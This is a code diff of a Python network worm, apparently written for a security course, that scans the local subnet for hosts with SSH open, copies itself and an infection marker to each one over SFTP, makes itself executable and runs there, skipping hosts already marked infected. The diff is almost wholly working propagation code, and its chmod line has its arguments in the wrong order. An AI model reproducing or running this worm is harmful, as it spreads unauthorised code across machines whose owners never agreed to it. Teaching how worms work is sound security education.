@@ -52,14 +52,18 @@ def spreadAndExecute(sshClient):
 	# to the victim system. The worm will
 	# copy itself to remote system, change
 	# its permissions to executable, and
-	# execute itself. Please check out the
-	# code we used for an in-class exercise.
-	# The code which goes into this function
-	# is very similar to that code.	
+	# execute itself.
+
+	# Instantiate file transfer object
 	sftp = sshClient.open_sftp()
-	sftp.put("/tmp/worm.py", "worm.py")
+	# Need full path and file name to not fck up
+	sftp.put("/tmp/worm.py", "/tmp/worm.py")
+	sftp.put(INFECTED_MARKER_FILE,INFECTED_MARKER_FILE)
+	# I don't think you need to make a py file executable like a .sh file but w/e
 	stds1 = sshClient.exec_command("chmod /tmp/worm.py 777")
+	# Execute on victim machine
 	stds2 = sshClient.exec_command("python /tmp/worm.py")
+	# Close sftp and ssh objects
 	sftp.close()
 	sshClient.close()
 
@@ -174,8 +178,10 @@ def getMyIP():
 #######################################################
 # Returns the list of systems on the same network
 # @return - a list of IP addresses on the same network
+# ** I added the current machines IP as an argument so
+# ** we don't have to hard code the subnet
 #######################################################
-def getHostsOnTheSameNetwork():
+def getHostsOnTheSameNetwork(myip):
 	
 	# Add code for scanning
 	# for hosts on the same network
@@ -186,8 +192,8 @@ def getHostsOnTheSameNetwork():
 	
 	# Scan the network for systems whose
 	# port 22 is open (that is, there is possibly
-	# SSH running there). 
-	portScanner.scan('192.168.1.0/24', arguments='-p 22 --open')
+	# SSH running there).
+	portScanner.scan(myip + '/24', arguments='-p 22 --open')
 	
 	# Scan the network for hoss
 	hostInfo = portScanner.all_hosts()	
@@ -240,7 +246,8 @@ if len(sys.argv) < 2:
 currentIP = getMyIP()
 
 # Get the hosts on the same network
-networkHosts = getHostsOnTheSameNetwork()
+# ** Pass current machines IP for dynamic subnet stuff
+networkHosts = getHostsOnTheSameNetwork(currentIP)
 
 # Remove the IP of the current system
 # from the list of discovered systems (we
@@ -262,7 +269,7 @@ for host in networkHosts:
 		print sshInfo
 		print "Trying to spread"
 		
-		# TODO: Check if the system was	
+		# Check if the system was	
 		# already infected. This can be
 		# done by checking whether the
 		# remote system contains /tmp/infected.txt
@@ -302,6 +309,7 @@ for host in networkHosts:
 			sshInfo.close()
 		# INFECTED_MARKER_FILE does not exist, spread & Exe
 		except IOError:
+			sftp.close()
 			spreadAndExecute(sshInfo)
 			print "worm successfully sent to " + host
 	else:
@@ -314,8 +322,4 @@ if len(sys.argv) >=2:
 		print "Cleaning Complete"
 	else:
 		print " Spreading Complete"
-		exit
-else:
-	markInfected()
-
-
+	
